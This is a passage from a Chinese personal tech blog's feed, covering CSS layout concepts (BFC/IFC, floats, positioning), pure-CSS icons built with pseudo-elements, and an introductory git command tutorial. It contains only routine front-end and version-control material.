box）：由行内级元素生成。行内级盒包括行内盒子和原子行内级盒子两种，区别在于该盒子是否参与行内格式化上下文（IFC，inline formatting context）的创建。</p></li><li><p><strong>行内盒</strong>（inline box）：参与行内格式化上下文创建的行内级盒称为行内盒。与块盒类似，行内盒也分为具名行内盒和匿名行内盒（anonymous inline box）两种。</p></li><li><p><strong>原子行内级盒</strong>（atomic inline-level box）：不参与行内格式化上下文创建的行内级盒。原子行内级盒子一开始叫做原子行内盒（atomic inline box），后被修正。原子行内级盒的内容不会拆分成多行显示。</p></li></ul><p>空元素（empty element）：不存在子节点（子元素或元素内的内容）；</p><p>行内元素：<code>a b span img input select strong（强调的语气）</code></p><p>块级元素有：<code>div ul ol li dl dt dd h1 h2 h3 h4…p</code></p><p>常见的空元素： <code>&lt;br&gt; &lt;hr&gt; &lt;img&gt; &lt;input&gt; &lt;link&gt; &lt;meta&gt;</code>用的比较少的：<code>&lt;area&gt; &lt;base&gt; &lt;col&gt; &lt;command&gt; &lt;embed&gt; &lt;keygen&gt; &lt;param&gt; &lt;source&gt; &lt;track&gt; &lt;wbr&gt;</code></p><h3 id="3-页面是如何布局的？"><a href="#3-页面是如何布局的？" class="headerlink" title="3.页面是如何布局的？"></a><strong>3.页面是如何布局的？</strong></h3><p>谈布局时，实际上说的都是盒的定位。</p><p>主要有普通流（normal flow）、绝对定位(absolute)、浮动布局(float)三种情况。布局根据盒的<strong>display</strong>，<strong>postion</strong>和<strong>float</strong>属性来决定。</p><h4 id="普通流"><a href="#普通流" class="headerlink" title="普通流"></a>普通流</h4><p>元素的默认属性是<code>position:static,float:none</code>称为普通流，主要规则是：</p><blockquote><p>块级盒 垂直依次排列。行内盒水平依次排列。</p></blockquote><p>postion为static时，每个盒根据普通流所计算出的确切位置来定位。</p><p>position为relative时，相对定位，此时每个盒还根据top，bottom，left，right在<strong>原本的位置</strong>基础上进行偏移，也就是说不设置position为非static，四个偏移属性是不生效的。</p><p>普通流中的块级盒有一些规则：</p><ul><li><p>普通流中块级盒会独占一行，在垂直方向上，一个接一个放置。</p></li><li><p>块级盒<strong>垂直方向</strong>的距离由margin决定，相邻两个块级盒的会发生<strong>垂直方向的margin重叠</strong>，注意是垂直方向，水平方向不会有这个问题。</p></li></ul><p>解决margin重叠的方法在之后的BFC的规则中会解释。</p><p>让两个元素不属于一个BFC，层级不一样就可以避免这个问题。但是两个元素是平级的话还是会出现margin重叠，其实解决的方式是遵循了：BFC是独立的，不受到外部的影响。</p><h4 id="浮动布局"><a href="#浮动布局" class="headerlink" title="浮动布局"></a>浮动布局</h4><p>当position为static或relative，且float不为none时，为浮动定位，生成了<strong>浮动盒</strong>（floated/floating box）。浮动盒在垂直方向上会脱离文档流，水平方向上，还是一个个按顺序排列，有的靠左，有的靠右。</p><p>对于块级盒，本来是独占一行，宽度是100%，但是变成浮动盒之后，自身的宽度就开始变成由内部撑起来。</p><p>对周围其他盒的影响：</p><p>外层盒如果是行内盒，会伸缩来适应内部浮动盒的大小。</p><p>相邻盒会环绕在浮动盒周围。</p><h4 id="绝对定位"><a href="#绝对定位" class="headerlink" title="绝对定位"></a>绝对定位</h4><p>当元素的position为absolute或fixed时，为绝对定位。元素脱离文档流，位置上和其父元素及相邻元素不再有关系，其位置会使用 top、bottom、left 和 right 相对其包含块进行计算。</p><p>对固定位置的元素来说，其包含块为整个视口，该元素相对视口进行绝对定位，因此滚动时元素的位置并不会改变。</p><h3 id="4-BFC和IFC是什么？"><a href="#4-BFC和IFC是什么？" class="headerlink" title="4.BFC和IFC是什么？"></a>4.BFC和IFC是什么？</h3><p>除了上文提到的<strong>定位</strong>规则，视觉格式化模型（Visual Formatting Model）是页面布局的更细粒度的算法机制。</p><p>Formatting context 是 W3C CSS2.1 规范中的一个概念。它是页面中的一块<strong>独立的</strong>渲染区域，有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。核心作用在于这块<strong>区域内部独立，不受外部的影响也不影响外部</strong>。</p><p>最常见的 Formatting context 有 块级格式化上下文 Block fomatting context (简称BFC)和 内联格式化上下文Inline formatting context (简称IFC)。CSS2.1中只有BFC和IFC，CSS3中增加了GFC和FFC。</p><h4 id="形成BFC的条件"><a href="#形成BFC的条件" class="headerlink" title="形成BFC的条件"></a>形成BFC的条件</h4><p>一个BFC包含创建该上下文的所有子盒，但不包括创建了新BFC的子盒的内部元素，也是为了强调BFC的<strong>独立</strong>原则。</p><p>自身满足下列条件之一就可产生一个BFC</p><ul><li><p>root element 根元素</p></li><li><p>float:not none 存在浮动</p></li><li><p>position:absolute，fixed 绝对定位</p></li><li><p>display:inline-block, table-cell, table-caption, flex, inline-flex</p></li><li><p>overflow:not visible</p></li></ul><p><strong>那对于子元素有要求吗？</strong></p><p>我们知道context在英文中的含义是上下文，可以引申为是一种氛围，一种组成，一项规则。内部的盒形成了上下文，参与到上下文中，遵循上下文的规则。</p><p>BFC中的block-level box参与在BFC中，遵循BFC的规则。</p><p>IFC的inline-level box参与在IFC中，遵循IFC的规则。</p><p>父元素产生了一个BFC，虽然BFC的子元素中有span等行内元素，依然不影响这个BFC的存在，所以说内部盒可以不是块级盒的，但是只有块级盒会遵循BFC的规则。Formatting Context最重要的观念是强调<strong>内部独立，不受外界影响</strong>。</p><h4 id="BFC规则"><a href="#BFC规则" class="headerlink" title="BFC规则"></a>BFC规则</h4><ul><li><p>从左到右布局中，BFC的各个内部元素的左margin与包含块的左border内相接触，对于rtl布局相反。</p></li><li><p>BFC不与浮动盒重叠。</p></li><li><p>BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。（但是容器本身还是会受到影响）。</p></li><li><p>计算整个BFC的高度时，浮动元素也参与计算（可以用来解决浮动情况下的高度崩塌，清浮动）。</p></li></ul><p>我们可以使用BFC和IFC的<strong>独立</strong>原则来解决一些问题。</p><h4 id="BFC的使用："><a href="#BFC的使用：" class="headerlink" title="BFC的使用："></a>BFC的使用：</h4><h5 id="1-清浮动"><a href="#1-清浮动" class="headerlink" title="1.清浮动"></a>1.清浮动</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.parent</span>&#123;<span class="attribute">width</span>: <span class="number">200px</span>;<span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e8e8e8</span>;&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.child</span>&#123;<span class="attribute">float</span>: left;<span class="attribute">width</span>:<span class="number">100px</span>;<span class="attribute">height</span>: <span class="number">100px</span>;<span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#666</span>;&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现parent高度崩塌，根据<strong>计算BFC的高度时，浮动元素也参与计算，</strong>使parent成为BFC，加上<code>.parent{overflow:hidden}</code>或<code>float:not none;display:inline-block;position:absolute,fixed</code>都可清浮动</p><h5 id="2-解决margin重叠"><a href="#2-解决margin重叠" class="headerlink" title="2.解决margin重叠"></a>2.解决margin重叠</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.parent</span>&#123;<span class="attribute">width</span>: <span class="number">200px</span>;<span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e8e8e8</span>;&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.child</span>&#123;<span class="attribute">margin</span>:<span class="number">100px</span>;<span class="attribute">width</span>:<span class="number">100px</span>;<span class="attribute">height</span>: <span class="number">100px</span>;<span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#666</span>;&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现预期上下child之间的距离应该是400px但是实际是200px，所以想办法使其中一个child成为一个独立的BFC，不受到外界的影响，将其中一个child包一层<code>&lt;div class=&quot;wrap&quot;&gt;&lt;/div&gt;,.wrap{overflow:hidden;}</code></p><h5 id="3-两栏自适应实现"><a href="#3-两栏自适应实现" class="headerlink" title="3.两栏自适应实现"></a>3.两栏自适应实现</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.content</span>&#123;<span class="attribute">width</span>: <span class="number">200px</span>;<span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e8e8e8</span>;&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.main</span>&#123;<span class="attribute">height</span>:<span class="number">200px</span>;<span class="attribute">background</span>: <span class="number">#fcc</span>;&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.aside</span>&#123;<span class="attribute">width</span>: <span class="number">100px</span>; <span class="attribute">height</span>: <span class="number">150px</span>; <span class="attribute">float</span>: left; <span class="attribute">background</span>: <span class="number">#f66</span>;&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"aside"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>现在的显示是content占一行，符合<strong>从左到右布局中，BFC的各个内部元素的左margin与包含块的左border内相接触</strong>。aside是浮动盒，想要实现两栏自适应，可以根据<strong>BFC不与浮动盒重叠可以</strong>加上<code>.main{overflow:hidden}</code>使main成为新的BFC即可。</p><p>以上所有的例子都体现了BFC最重要的<strong>独立</strong>原则。</p><p>BFC和浮动的关系：</p><p>浮动定位和清除浮动时只会应用于同一个BFC内的元素。</p><p>浮动不会影响其它BFC中元素的布局，而清除浮动只能清除同一BFC中在它前面的元素的浮动。</p><p>margin重叠也只会发生在属于同一BFC的块级元素之间。</p><h4 id="IFC"><a href="#IFC" class="headerlink" title="IFC"></a>IFC</h4><p>在IFC中，盒子从顶部开始一个接一个水平排列。</p><p>盒模型在IFC的元素中应用的不是很完全，给行内元素设置水平方向的padiding，border，margin会生效，但是垂直方向的margin并不会生效，而且垂直方向的padding和border看起来生效了，但是不会影响周围的元素，因为在IFC中，垂直方向上其他的inline box不会被padding和border推开。</p><p>一个包含着一些排成一条线的盒子的外层盒称为line box。（float元素也是排成一行呀？？？）</p><p>vertical-align对齐方式也多种多样：baseline，middle，top，bottom等。</p><p>IFC的规则很复杂，所以经常遇到vertical-align根本不生效的情况，根本没有text-align那么好用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">strong &#123;</span></span><br><span class="line"><span class="undefined">margin: 20px;</span></span><br><span class="line"><span class="undefined">padding: 20px;</span></span><br><span class="line"><span class="css"><span class="selector-tag">border</span>: 5<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#ff6700</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>即使给</span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>这里<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">设置了垂直方向上的margin也不会生效，设置垂直方向的padding和border也不会影响外部</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>IFC的规则</p><p><a href="https://segmentfault.com/a/1190000004246731" target="_blank" rel="noopener">https://segmentfault.com/a/1190000004246731</a></p><p><a href="#">https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Visual_formatting_model</a></p><h4 id="回顾与总结："><a href="#回顾与总结：" class="headerlink" title="回顾与总结："></a>回顾与总结：</h4><p>1.行内元素和块级元素等基础知识总结。</p><p>2.定位规则有三种：1.普通流，2.浮动布局，3.绝对定位。</p><p>3.BFC乃至Formatting Context 最重要的特性就是<strong>内部独立，不受外部影响</strong>。可以用来解决<strong>高度崩塌</strong>，<strong>清浮动</strong>，<strong>margin重叠</strong>，<strong>两栏自适应</strong>等常见问题。</p><h4 id="常见的面试问题与细节思考："><a href="#常见的面试问题与细节思考：" class="headerlink" title="常见的面试问题与细节思考："></a>常见的面试问题与细节思考：</h4><p>1.position的四种属性有啥区别</p><p>2.BFC是什么</p><p>3.怎么清除浮动</p><p>4.两栏自适应和多栏自适应的实现方式</p><p>5.水平居中和垂直居中的实现方式</p><p>现在可以回答上来了吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 CSS 」通过伪元素来得到一些常见的icon</title>
      <link href="/2017/03/18/css_icons/"/>
      <url>/2017/03/18/css_icons/</url>
      
        <content type="html"><![CDATA[<p>通过伪元素<code>:before</code>和<code>:after</code>来得到一些常用的icon<br><a id="more"></a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">// caret</span><br><span class="line"><span class="selector-class">.icon_caret</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">5px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border-width</span>: <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">border-style</span>: solid;</span><br><span class="line">    <span class="attribute">border-color</span>: <span class="number">#9d9d9d</span> transparent transparent transparent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// &gt;</span><br><span class="line"><span class="selector-class">.icon_gter</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: .<span class="number">16rem</span>;</span><br><span class="line">    <span class="attribute">height</span>: .<span class="number">16rem</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">0</span>;</span><br><span class="line">    &amp;:after&#123;</span><br><span class="line">        <span class="selector-tag">content</span>: "";</span><br><span class="line">        <span class="selector-tag">width</span>: <span class="selector-class">.08rem</span>;</span><br><span class="line">        <span class="selector-tag">height</span>: <span class="selector-class">.08rem</span>;</span><br><span class="line">        <span class="selector-tag">border-width</span>: 1<span class="selector-tag">px</span>;</span><br><span class="line">        <span class="selector-tag">border-style</span>: <span class="selector-tag">solid</span>;</span><br><span class="line">        <span class="selector-tag">border-color</span>: <span class="selector-tag">transparent</span> <span class="selector-tag">transparent</span> <span class="selector-tag">rgba</span>(0,0,0,0<span class="selector-class">.3</span>) <span class="selector-tag">rgba</span>(0,0,0,0<span class="selector-class">.3</span>);</span><br><span class="line">        <span class="selector-tag">-webkit-transform</span>: <span class="selector-tag">rotate</span>(<span class="selector-tag">-135deg</span>);</span><br><span class="line">        <span class="selector-tag">transform</span>: <span class="selector-tag">rotate</span>(<span class="selector-tag">-135deg</span>);</span><br><span class="line">        <span class="selector-tag">position</span>: <span class="selector-tag">absolute</span>;</span><br><span class="line">        <span class="selector-tag">left</span>: <span class="selector-class">.05rem</span>;</span><br><span class="line">        <span class="selector-tag">top</span>: <span class="selector-class">.04rem</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">// &lt;</span><br><span class="line"><span class="selector-class">.icon_lser</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: .<span class="number">16rem</span>;</span><br><span class="line">    <span class="attribute">height</span>: .<span class="number">16rem</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">0</span>;</span><br><span class="line">    &amp;:after&#123;</span><br><span class="line">        <span class="selector-tag">content</span>: "";</span><br><span class="line">        <span class="selector-tag">width</span>: <span class="selector-class">.08rem</span>;</span><br><span class="line">        <span class="selector-tag">height</span>: <span class="selector-class">.08rem</span>;</span><br><span class="line">        <span class="selector-tag">border-width</span>: 1<span class="selector-tag">px</span>;</span><br><span class="line">        <span class="selector-tag">border-style</span>: <span class="selector-tag">solid</span>;</span><br><span class="line">        <span class="selector-tag">border-color</span>: <span class="selector-tag">transparent</span> <span class="selector-tag">transparent</span> <span class="selector-tag">rgba</span>(0,0,0,0<span class="selector-class">.3</span>) <span class="selector-tag">rgba</span>(0,0,0,0<span class="selector-class">.3</span>);</span><br><span class="line">        <span class="selector-tag">-webkit-transform</span>: <span class="selector-tag">rotate</span>(<span class="selector-tag">-45deg</span>);</span><br><span class="line">        <span class="selector-tag">transform</span>: <span class="selector-tag">rotate</span>(<span class="selector-tag">-45deg</span>);</span><br><span class="line">        <span class="selector-tag">position</span>: <span class="selector-tag">absolute</span>;</span><br><span class="line">        <span class="selector-tag">left</span>: <span class="selector-class">.05rem</span>;</span><br><span class="line">        <span class="selector-tag">top</span>: <span class="selector-class">.04rem</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.triangle</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border-width</span>:<span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">border-style</span>:solid;</span><br><span class="line">    <span class="attribute">border-color</span>:transparent transparent red transparent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意每个border-color对应一个三角形</p>]]></content>
      
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 工具 」git 操作及原理</title>
      <link href="/2017/03/12/git/"/>
      <url>/2017/03/12/git/</url>
      
        <content type="html"><![CDATA[<p>最近全面整理下工作中遇到的git问题，了解了下git工作的原理。<br><a id="more"></a></p><h4 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看增删改文件状态</span></span><br><span class="line">git status</span><br><span class="line"><span class="comment"># 增删改进入暂存区</span></span><br><span class="line">git add .</span><br><span class="line"><span class="comment"># 提交待push,staged area</span></span><br><span class="line">git commit -am <span class="string">'comment'</span></span><br><span class="line"><span class="comment"># 从staged area回到暂存区</span></span><br><span class="line">git reset HEAD . </span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p>提示up-to-date是最新的</p><h4 id="文件生命周期"><a href="#文件生命周期" class="headerlink" title="文件生命周期"></a>文件生命周期</h4><p>工作区（working tree，未add的，untracked）=&gt;暂存区（已add的，tracked,staged）=&gt;index（staging area）(commit未push的，staged)=&gt;远端仓库（repository）</p><p><img src="/images/git_file_life.png" alt=""></p><p>HEAD，origin，remote这些概念后面再说</p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有config</span></span><br><span class="line">git config --list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line">git config --global user.name <span class="string">'Eva'</span></span><br><span class="line">git config --global user.email <span class="string">'eva@163.com'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 换行符转为crlf</span></span><br><span class="line">git config --global core.autocrlf ture</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置别名：git last为显示上次提交信息，git last -p</span></span><br><span class="line">git config --global alias.last <span class="string">'log -1 HEAD'</span></span><br></pre></td></tr></table></figure><h4 id="生成私钥，添加在setting里"><a href="#生成私钥，添加在setting里" class="headerlink" title="生成私钥，添加在setting里"></a>生成私钥，添加在setting里</h4><p>有时候提交时一直要求输入密码，我们需要在git clone时选择ssh的方式，这样就免去了每次提交输密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看私钥</span></span><br><span class="line"><span class="built_in">cd</span> ~/.ssh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成私钥</span></span><br><span class="line">ssh-keygen -t rsa -C <span class="string">"eva@163.com"</span></span><br></pre></td></tr></table></figure><h4 id="新建repository"><a href="#新建repository" class="headerlink" title="新建repository"></a>新建repository</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> d/workspace</span><br><span class="line"></span><br><span class="line">mkdir demo</span><br><span class="line"></span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line">git remote add origin <span class="string">'https://github.com/EvaLotus/EvaLotus.github.io'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次需要-u，用来set upstream</span></span><br><span class="line">git push -u origin/master</span><br></pre></td></tr></table></figure><h4 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h4><p>git command -h查看命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提交的主要有：新增，修改，删除</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看新增，修改，删除了哪些文件</span></span><br><span class="line">git status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看具体新增，修改，删除</span></span><br><span class="line">git diff</span><br><span class="line"><span class="comment"># 具体文件修改了啥</span></span><br><span class="line">git diff a.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 丢弃单文件修改，删除</span></span><br><span class="line">git checkout -- a.txt</span><br><span class="line"><span class="comment"># 丢弃所有修改，删除</span></span><br><span class="line">git checkout -- .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加单文件修改到暂存区下管理</span></span><br><span class="line">git add file.txt</span><br><span class="line"><span class="comment"># 新增，修改，删除都添加到暂存区</span></span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制add，gitignore里的也会添加</span></span><br><span class="line">git add -f</span><br><span class="line"></span><br><span class="line"><span class="comment"># rm都是对暂存区的文件来说的，工作区的直接rm就可以了</span></span><br><span class="line"><span class="comment"># rm必须是在远端有的文件</span></span><br><span class="line">git rm</span><br><span class="line"><span class="comment"># 从暂存区中移除，从tracked变成untracked</span></span><br><span class="line">git rm --cached</span><br><span class="line"><span class="comment"># 直接删除文件</span></span><br><span class="line">git rm -f</span><br><span class="line"><span class="comment"># 没有添加到暂存区的，还在工作区的直接</span></span><br><span class="line">rm a.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只要git add .过的，就已经在暂存区了，checkout -- .就不管用了。只能git reset HEAD 了</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将所有新增，修改，删除都从commit中返回</span></span><br><span class="line">git reset HEAD .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂存</span></span><br><span class="line">git stash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复暂存</span></span><br><span class="line">git stash pop</span><br><span class="line"></span><br><span class="line">git commit -m <span class="string">"my 这里是注释"</span></span><br><span class="line"><span class="comment"># 上次漏提交了文件，可以使用amend命令来修改上次的提交，使log更好看</span></span><br><span class="line">git commit -amend</span><br><span class="line"><span class="comment"># 多个提交时用-a</span></span><br><span class="line">git commit -am <span class="string">"这里是注释"</span></span><br></pre></td></tr></table></figure><h4 id="回退"><a href="#回退" class="headerlink" title="回退"></a>回退</h4><figure 